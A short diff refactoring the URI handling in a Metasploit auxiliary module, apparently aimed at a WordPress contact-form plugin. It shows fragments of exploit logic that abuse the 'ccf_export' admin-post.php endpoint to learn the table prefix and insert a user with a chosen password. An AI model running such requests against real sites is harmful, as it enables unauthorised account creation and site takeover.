@@ -43,7 +43,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def get_table_prefix
     res = send_request_cgi({
-      'uri'       => normalize_uri(wordpress_url_backend, 'admin-post.php'),
+      'uri'       => wordpress_url_admin_post,
       'method'    => 'POST',
       'vars_post' => {
         'ccf_export' => "1"
@@ -81,10 +81,9 @@ class Metasploit3 < Msf::Auxiliary
     post_data = data.to_s
 
     print_status("#{peer} - Inserting user #{username} with password #{password}")
-    uri = normalize_uri(wordpress_url_backend, 'admin-post.php')
     res = send_request_cgi(
       'method'   => 'POST',
-      'uri'      => uri,
+      'uri'      => wordpress_url_admin_post,
       'ctype'    => "multipart/form-data; boundary=#{data.bound}",
       'data'     => post_data
     )
